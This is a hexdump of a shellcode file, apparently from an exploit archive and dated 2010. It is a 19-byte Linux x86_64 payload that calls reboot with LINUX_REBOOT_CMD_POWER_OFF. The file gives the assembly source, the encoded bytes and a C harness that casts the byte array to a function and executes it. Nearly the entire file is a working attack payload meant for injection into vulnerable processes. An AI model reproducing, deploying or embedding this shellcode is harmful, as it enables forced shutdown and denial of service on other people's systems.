00000000  23 20 4c 69 6e 75 78 2f  78 38 36 5f 36 34 20 72  |# Linux/x86_64 r|
00000010  65 62 6f 6f 74 28 50 4f  57 45 52 5f 4f 46 46 29  |eboot(POWER_OFF)|
00000020  20 31 39 20 62 79 74 65  73 20 73 68 65 6c 6c 63  | 19 bytes shellc|
00000030  6f 64 65 0a 23 20 44 61  74 65 3a 20 32 30 31 30  |ode.# Date: 2010|
00000040  2d 30 34 2d 32 35 0a 23  20 41 75 74 68 6f 72 3a  |-04-25.# Author:|
00000050  20 7a 62 74 0a 23 20 54  65 73 74 65 64 20 6f 6e  | zbt.# Tested on|
00000060  3a 20 78 38 36 5f 36 34  20 44 65 62 69 61 6e 20  |: x86_64 Debian |
00000070  47 4e 55 2f 4c 69 6e 75  78 0a 20 0a 20 0a 2f 2a  |GNU/Linux. . ./*|
00000080  0a 20 20 20 20 3b 20 72  65 62 6f 6f 74 28 4c 49  |.    ; reboot(LI|
00000090  4e 55 58 5f 52 45 42 4f  4f 54 5f 4d 41 47 49 43  |NUX_REBOOT_MAGIC|
000000a0  31 2c 20 4c 49 4e 55 58  5f 52 45 42 4f 4f 54 5f  |1, LINUX_REBOOT_|
000000b0  4d 41 47 49 43 32 2c 0a  4c 49 4e 55 58 5f 52 45  |MAGIC2,.LINUX_RE|
000000c0  42 4f 4f 54 5f 43 4d 44  5f 50 4f 57 45 52 5f 4f  |BOOT_CMD_POWER_O|
000000d0  46 46 29 0a 20 0a 20 20  20 20 73 65 63 74 69 6f  |FF). .    sectio|
000000e0  6e 20 2e 74 65 78 74 0a  20 20 20 20 20 20 20 20  |n .text.        |
000000f0  67 6c 6f 62 61 6c 20 5f  73 74 61 72 74 0a 20 0a  |global _start. .|
00000100  20 20 20 20 5f 73 74 61  72 74 3a 0a 20 20 20 20  |    _start:.    |
00000110  20 20 20 20 6d 6f 76 20  20 20 20 20 65 64 78 2c  |    mov     edx,|
00000120  20 30 78 34 33 32 31 66  65 64 63 0a 20 20 20 20  | 0x4321fedc.    |
00000130  20 20 20 20 6d 6f 76 20  20 20 20 20 65 73 69 2c  |    mov     esi,|
00000140  20 30 78 32 38 31 32 31  39 36 39 0a 20 20 20 20  | 0x28121969.    |
00000150  20 20 20 20 6d 6f 76 20  20 20 20 20 65 64 69 2c  |    mov     edi,|
00000160  20 30 78 66 65 65 31 64  65 61 64 0a 20 20 20 20  | 0xfee1dead.    |
00000170  20 20 20 20 6d 6f 76 20  20 20 20 20 61 6c 2c 20  |    mov     al, |
00000180  20 30 78 61 39 0a 20 20  20 20 20 20 20 20 73 79  | 0xa9.        sy|
00000190  73 63 61 6c 6c 0a 2a 2f  0a 69 6e 74 20 6d 61 69  |scall.*/.int mai|
000001a0  6e 28 76 6f 69 64 29 0a  7b 0a 20 20 20 20 63 68  |n(void).{.    ch|
000001b0  61 72 20 72 65 62 6f 6f  74 5b 5d 20 3d 0a 20 20  |ar reboot[] =.  |
000001c0  20 20 22 5c 78 62 61 5c  78 64 63 5c 78 66 65 5c  |  "\xba\xdc\xfe\|
000001d0  78 32 31 5c 78 34 33 22  20 20 2f 2f 20 6d 6f 76  |x21\x43"  // mov|
000001e0  20 20 20 20 24 30 78 34  33 32 31 66 65 64 63 2c  |    $0x4321fedc,|
000001f0  25 65 64 78 0a 20 20 20  20 22 5c 78 62 65 5c 78  |%edx.    "\xbe\x|
00000200  36 39 5c 78 31 39 5c 78  31 32 5c 78 32 38 22 20  |69\x19\x12\x28" |
00000210  20 2f 2f 20 6d 6f 76 20  20 20 20 24 30 78 32 38  | // mov    $0x28|
00000220  31 32 31 39 36 39 2c 25  65 73 69 0a 20 20 20 20  |121969,%esi.    |
00000230  22 5c 78 62 66 5c 78 61  64 5c 78 64 65 5c 78 65  |"\xbf\xad\xde\xe|
00000240  31 5c 78 66 65 22 20 20  2f 2f 20 6d 6f 76 20 20  |1\xfe"  // mov  |
00000250  20 20 24 30 78 66 65 65  31 64 65 61 64 2c 25 65  |  $0xfee1dead,%e|
00000260  64 69 0a 20 20 20 20 22  5c 78 62 30 5c 78 61 39  |di.    "\xb0\xa9|
00000270  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000280  2f 20 6d 6f 76 20 20 20  20 24 30 78 61 39 2c 25  |/ mov    $0xa9,%|
00000290  61 6c 0a 20 20 20 20 22  5c 78 30 66 5c 78 30 35  |al.    "\x0f\x05|
000002a0  22 3b 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |";             /|
000002b0  2f 20 73 79 73 63 61 6c  6c 0a 20 0a 20 20 20 20  |/ syscall. .    |
000002c0  28 2a 28 76 6f 69 64 20  28 2a 29 28 29 29 20 72  |(*(void (*)()) r|
000002d0  65 62 6f 6f 74 29 28 29  3b 0a 20 0a 20 20 20 20  |eboot)();. .    |
000002e0  72 65 74 75 72 6e 20 30  3b 0a 7d                 |return 0;.}|
000002eb
